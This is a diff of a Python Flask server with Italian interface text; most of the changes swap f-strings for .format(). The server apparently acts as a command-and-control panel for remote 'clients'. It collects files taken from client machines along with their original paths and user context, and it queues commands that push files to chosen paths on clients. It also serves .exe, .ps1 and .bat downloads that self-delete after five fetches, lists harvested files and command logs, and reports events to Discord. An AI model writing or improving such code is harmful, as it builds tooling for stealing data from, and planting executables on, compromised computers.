         file_size = file.tell()
-        file.seek(0)  # Ritorna all'inizio
+        file.seek(0)
         
         if file_size > MAX_UPLOAD_SIZE:
-            return jsonify({"status": "error", "message": f"File troppo grande (max {MAX_UPLOAD_SIZE/1024/1024}MB)"}), 400
+            return jsonify({"status": "error", "message": "File troppo grande (max {}MB)".format(MAX_UPLOAD_SIZE/1024/1024)}), 400
         
-        # Crea nome file sicuro
         timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
         safe_filename = sanitize_filename(file.filename)
-        save_filename = f"{timestamp}_{client_id}_{safe_filename}"
-        save_path = os.path.join(UPLOADS_DIR, save_filename)
+        save_filename = "{}_{}_{}".format(timestamp, client_id, safe_filename)
+        save_path = os.path.join("uploads", save_filename)
         
-        # Salva file
         file.save(save_path)
         
-        # Log metadata
         metadata = {
             "client_id": client_id,
             "operation": "download",
@@ -1012,18 +799,16 @@ def handle_file_upload():
             "timestamp": datetime.now().isoformat()
         }
         
-        # Salva metadata in results/
-        metadata_filename = f"upload_{timestamp}_{client_id}.json"
-        with open(os.path.join(RESULTS_DIR, metadata_filename), 'w') as f:
+        metadata_filename = "upload_{}_{}.json".format(timestamp, client_id)
+        with open(os.path.join("results", metadata_filename), 'w') as f:
             json.dump(metadata, f, indent=2)
         
-        # Notifica Discord
         send_to_discord(
-            f"📥 **File ricevuto da** `{client_id}`\n"
-            f"**File:** `{file.filename}`\n"
-            f"**Percorso originale:** `{original_path}`\n"
-            f"**Utente:** {target_user if target_user else 'SYSTEM'}\n"
-            f"**Dimensione:** {file_size / 1024:.1f} KB"
+            "📥 **File ricevuto da** `{}`\n".format(client_id) +
+            "**File:** `{}`\n".format(file.filename) +
+            "**Percorso originale:** `{}`\n".format(original_path) +
+            "**Utente:** {}\n".format(target_user if target_user else 'SYSTEM') +
+            "**Dimensione:** {:.1f} KB".format(file_size / 1024)
         )
         
         return jsonify({
@@ -1034,7 +819,7 @@ def handle_file_upload():
         })
         
     except Exception as e:
-        send_to_discord(f"❌ Errore upload file: {str(e)[:200]}")
+        send_to_discord("❌ Errore upload file: {}".format(str(e)[:200]))
         return jsonify({"status": "error", "message": str(e)}), 500
 
 @app.route('/api/prepare_upload', methods=['POST'])
@@ -1049,51 +834,296 @@ def prepare_upload():
         if not all([client_id, server_filename, client_path]):
             return "Errore: parametri mancanti", 400
         
-        # Validazione filename
         server_filename = sanitize_filename(server_filename)
-        file_path = os.path.join(DOWNLOADS_DIR, server_filename)
+        file_path = os.path.join("downloads", server_filename)
         
         if not os.path.exists(file_path):
-            return f"Errore: file '{server_filename}' non trovato nella cartella downloads/", 404
+            return "Errore: file '{}' non trovato nella cartella downloads/".format(server_filename), 404
         
-        # Genera URL temporaneo
         file_id = client_manager.generate_file_id()
-        temp_filename = f"{file_id}_{server_filename}"
-        temp_path = os.path.join(DOWNLOADS_DIR, temp_filename)
+        temp_filename = "{}_{}".format(file_id, server_filename)
+        temp_path = os.path.join("downloads", temp_filename)
         
-        # Copia file con nome temporaneo
         import shutil
         shutil.copy2(file_path, temp_path)
         
-        # Crea URL
-        file_url = f"/downloads/{temp_filename}"
-        full_url = f"{request.host_url.rstrip('/')}{file_url}"
+        file_url = "/downloads/{}".format(temp_filename)
+        full_url = "{}{}".format(request.host_url.rstrip('/'), file_url)
         
-        # Comando al client per scaricare
-        command = f"upload_from_server:{full_url}|{client_path}"
+        command = "upload_from_server:{}|{}".format(full_url, client_path)
         if target_user != "SYSTEM":
-            command = f"user_{target_user}:{command}"
+            command = "user_{}:{}".format(target_user, command)
         
         client_manager.add_command(client_id, command)
         
         send_to_discord(
-            f"📤 Upload preparato per `{client_id}`\n"
-            f"**File:** `{server_filename}` → `{client_path}`\n"
-            f"**Utente:** {target_user if target_user != 'SYSTEM' else 'SYSTEM (tutti)'}"
+            "📤 Upload preparato per `{}`\n".format(client_id) +
+            "**File:** `{}` → `{}`\n".format(server_filename, client_path) +
+            "**Utente:** {}".format(target_user if target_user != 'SYSTEM' else 'SYSTEM (tutti)')
         )
         
-        return f'''
+        return '''
         <h3>✅ Upload Preparato!</h3>
-        <p><strong>Client:</strong> <code>{client_id}</code></p>
-        <p><strong>File:</strong> <code>{server_filename}</code></p>
-        <p><strong>Destinazione:</strong> <code>{client_path}</code></p>
-        <p><strong>URL Temporaneo:</strong> <code>{full_url}</code></p>
-        <p><strong>Utente Target:</strong> {target_user if target_user != "SYSTEM" else "SYSTEM (tutti)"}</p>
+        <p><strong>Client:</strong> <code>{}</code></p>
+        <p><strong>File:</strong> <code>{}</code></p>
+        <p><strong>Destinazione:</strong> <code>{}</code></p>
+        <p><strong>URL Temporaneo:</strong> <code>{}</code></p>
+        <p><strong>Utente Target:</strong> {}</p>
         <p><a href="/admin">↶ Torna al Panel</a></p>
-        '''
+        '''.format(
+            client_id,
+            server_filename,
+            client_path,
+            full_url,
+            target_user if target_user != "SYSTEM" else "SYSTEM (tutti)"
+        )
         
     except Exception as e:
-        return f"Errore: {str(e)}", 500
+        return "Errore: {}".format(str(e)), 500
+
+@app.route('/downloads/<filename>')
+def serve_download_file(filename):
+    """Serve file per download dai client"""
+    try:
+        if '..' in filename or '/' in filename:
+            return "Access denied", 403
+        
+        file_path = os.path.join("downloads", filename)
+        
+        if not os.path.exists(file_path):
+            for ext in ['', '.exe', '.txt', '.ps1', '.bat', '.zip']:
+                test_path = file_path + ext
+                if os.path.exists(test_path):
+                    file_path = test_path
+                    break
+        
+        if not os.path.exists(file_path):
+            return "File non trovato o scaduto", 404
+        
+        counter_file = file_path + '.counter'
+        try:
+            with open(counter_file, 'r') as f:
+                count = int(f.read().strip())
+        except:
+            count = 0
+        
+        count += 1
+        with open(counter_file, 'w') as f:
+            f.write(str(count))
+        
+        if count >= 5:
+            try:
+                os.remove(file_path)
+                os.remove(counter_file)
+            except:
+                pass
+        
+        return send_from_directory("downloads", os.path.basename(file_path), as_attachment=True)
+        
+    except Exception as e:
+        return "Errore: {}".format(str(e)), 500
+
+@app.route('/uploads')
+def view_uploads():
+    """Pagina file scaricati"""
+    try:
+        upload_files = sorted(glob.glob("uploads/*"), key=os.path.getmtime, reverse=True)
+        
+        files_list = ""
+        for i, file_path in enumerate(upload_files[:50]):
+            filename = os.path.basename(file_path)
+            size_kb = os.path.getsize(file_path) / 1024
+            mtime = datetime.fromtimestamp(os.path.getmtime(file_path))
+            
+            parts = filename.split('_', 2)
+            if len(parts) >= 3:
+                timestamp = parts[0]
+                client_id = parts[1]
+                original_name = '_'.join(parts[2:])
+            else:
+                client_id = "N/A"
+                original_name = filename
+            
+            files_list += '''
+            <tr>
+                <td>{}</td>
+                <td><a href="/get_upload/{}" download>{}</a></td>
+                <td>{}</td>
+                <td>{}</td>
+                <td>{:.1f} KB</td>
+            </tr>
+            '''.format(i+1, filename, original_name, client_id, mtime.strftime('%Y-%m-%d %H:%M'), size_kb)
+        
+        if not files_list:
+            files_list = '<tr><td colspan="5" style="text-align: center; padding: 20px; color: #666;">📭 Nessun file scaricato</td></tr>'
+        
+        return '''
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>File Scaricati - v{}</title>
+            <style>
+                body {{ font-family: Arial; margin: 20px; }}
+                table {{ width: 100%; border-collapse: collapse; margin: 20px 0; }}
+                th, td {{ border: 1px solid #ddd; padding: 10px; text-align: left; }}
+                th {{ background-color: #f2f2f2; }}
+                tr:hover {{ background-color: #f5f5f5; }}
+                .header {{ background: #343a40; color: white; padding: 20px; border-radius: 8px; }}
+            </style>
+        </head>
+        <body>
+            <div class="header">
+                <h1>📁 File Scaricati dai Client</h1>
+                <p><a href="/" style="color: #80bdff;">🏠 Home</a> | <a href="/admin" style="color: #80bdff;">📋 Admin Panel</a></p>
+            </div>
+            
+            <h3>Ultimi 50 file:</h3>
+            <table>
+                <tr><th>#</th><th>File</th><th>Client ID</th><th>Data/Ora</th><th>Dimensione</th></tr>
+                {}
+            </table>
+        </body>
+        </html>
+        '''.format(CURRENT_VERSION, files_list)
+    except Exception as e:
+        return "<h2>Errore caricamento uploads: {}</h2>".format(str(e))
+
+@app.route('/get_upload/<filename>')
+def get_upload(filename):
+    """Scarica file dalla cartella uploads"""
+    try:
+        if '..' in filename or '/' in filename:
+            return "Access denied", 403
+        
+        return send_from_directory("uploads", filename, as_attachment=True)
+    except Exception as e:
+        return "Errore: {}".format(str(e)), 500
+
+@app.route('/logs')
+def view_logs():
+    """Pagina log"""
+    try:
+        log_files = sorted(glob.glob("results/*.json"), key=os.path.getmtime, reverse=True)
+        
+        files_list = ""
+        for i, log_file in enumerate(log_files[:50]):
+            filename = os.path.basename(log_file)
+            size_kb = os.path.getsize(log_file) / 1024
+            mtime = datetime.fromtimestamp(os.path.getmtime(log_file))
+            
+            try:
+                with open(log_file, 'r', encoding='utf-8') as f:
+                    data = json.load(f)
+                client_id = data.get('client_id', 'N/A')
+                command = data.get('command', 'N/A')
+            except:
+                client_id = "Errore lettura"
+                command = "N/A"
+            
+            files_list += '''
+            <tr>
+                <td>{}</td>
+                <td><a href="/view_log/{}">{}</a></td>
+                <td>{}</td>
+                <td><code>{}{}</code></td>
+                <td>{}</td>
+                <td>{:.1f} KB</td>
+            </tr>
+            '''.format(i+1, filename, filename, client_id, command[:30], '...' if len(command) > 30 else '', mtime.strftime('%Y-%m-%d %H:%M'), size_kb)
+        
+        if not files_list:
+            files_list = '<tr><td colspan="6" style="text-align: center; padding: 20px; color: #666;">📭 Nessun log disponibile</td></tr>'
+        
+        return '''
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>Log Client - v{}</title>
+            <style>
+                body {{ font-family: Arial; margin: 20px; }}
+                table {{ width: 100%; border-collapse: collapse; margin: 20px 0; }}
+                th, td {{ border: 1px solid #ddd; padding: 10px; text-align: left; }}
+                th {{ background-color: #f2f2f2; }}
+                tr:hover {{ background-color: #f5f5f5; }}
+                .header {{ background: #343a40; color: white; padding: 20px; border-radius: 8px; }}
+                code {{ background: #e8f4fc; padding: 2px 5px; border-radius: 3px; }}
+            </style>
+        </head>
+        <body>
+            <div class="header">
+                <h1>📄 Log Client</h1>
+                <p><a href="/" style="color: #80bdff;">🏠 Home</a> | <a href="/admin" style="color: #80bdff;">📋 Admin Panel</a></p>
+            </div>
+            
+            <h3>Ultimi 50 log:</h3>
+            <table>
+                <tr><th>#</th><th>File</th><th>Client ID</th><th>Comando</th><th>Data/Ora</th><th>Dimensione</th></tr>
+                {}
+            </table>
+        </body>
+        </html>
+        '''.format(CURRENT_VERSION, files_list)
+    except Exception as e:
+        return "<h2>Errore caricamento log: {}</h2>".format(str(e))
+
+@app.route('/view_log/<log_filename>')
+def view_single_log(log_filename):
+    """Visualizza singolo log"""
+    try:
+        filepath = os.path.join("results", log_filename)
+        
+        if not os.path.exists(filepath):
+            return "<h2>File non trovato: {}</h2>".format(log_filename)
+        
+        with open(filepath, 'r', encoding='utf-8') as f:
+            data = json.load(f)
+        
+        formatted_json = json.dumps(data, indent=2, ensure_ascii=False)
+        
+        client_id = data.get('client_id', 'N/A')
+        command = data.get('command', 'N/A')
+        timestamp = data.get('timestamp', time.time())
+        dt = datetime.fromtimestamp(timestamp)
+        
+        return '''
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>Log: {}</title>
+            <style>
+                body {{ font-family: Arial; margin: 20px; }}
+                pre {{ background: #f5f5f5; padding: 15px; border-radius: 5px; overflow: auto; max-height: 80vh; }}
+                .info {{ background: #e8f4fc; padding: 15px; border-radius: 5px; margin-bottom: 20px; }}
+                a {{ color: #007bff; text-decoration: none; }}
+            </style>
+        </head>
+        <body>
+            <h1>📄 Log: {}</h1>
+            
+            <div class="info">
+                <p><strong>Client ID:</strong> {}</p>
+                <p><strong>Comando:</strong> <code>{}</code></p>
+                <p><strong>Data/Ora:</strong> {}</p>
+                <p><strong>Dimensione:</strong> {:.1f} KB</p>
+                <p><a href="/logs">⬅ Torna alla lista log</a> | <a href="/admin">📋 Admin Panel</a></p>
+            </div>
+            
+            <h3>Contenuto JSON:</h3>
+            <pre>{}</pre>
+        </body>
+        </html>
+        '''.format(
+            log_filename,
+            log_filename,
+            client_id,
+            command,
+            dt.strftime('%Y-%m-%d %H:%M:%S'),
+            os.path.getsize(filepath) / 1024,
+            formatted_json
+        )
+        
+    except Exception as e:
+        return "<h2>Errore lettura file: {}</h2>".format(str(e))
 
 @app.route('/api/remove_client', methods=['POST'])
 def remove_client_endpoint():
@@ -1105,7 +1135,7 @@ def remove_client_endpoint():
         
         client_manager.remove_client(client_id)
         
-        send_to_discord(f"🗑️ Client `{client_id}` rimosso manualmente")
+        send_to_discord("🗑️ Client `{}` rimosso manualmente".format(client_id))
         
         return '''
         <h3>Client Rimosso!</h3>
@@ -1114,7 +1144,7 @@ def remove_client_endpoint():
         '''
         
     except Exception as e:
-        return f"Errore: {str(e)}", 500
+        return "Errore: {}".format(str(e)), 500
 
 @app.route('/api/clients', methods=['GET'])
 def list_clients_api():
@@ -1130,10 +1160,9 @@ def list_clients_api():
 # 🏁 AVVIO SERVER
 # ============================================
 if __name__ == '__main__':
-    # Thread per cleanup automatico
     def cleanup_loop():
         while True:
-            time.sleep(3600)  # Ogni ora
+            time.sleep(3600)
             try:
                 cleanup_old_files()
             except:
@@ -1141,7 +1170,7 @@ if __name__ == '__main__':
     
     threading.Thread(target=cleanup_loop, daemon=True).start()
     
-    send_to_discord(f"🚀 **Server v{CURRENT_VERSION} avviato su PythonAnywhere**")
+    send_to_discord("🚀 **Server v{} avviato su PythonAnywhere**".format(CURRENT_VERSION))
     
     port = int(os.environ.get('PORT', 5000))
     app.run(host='0.0.0.0', port=port, debug=False)
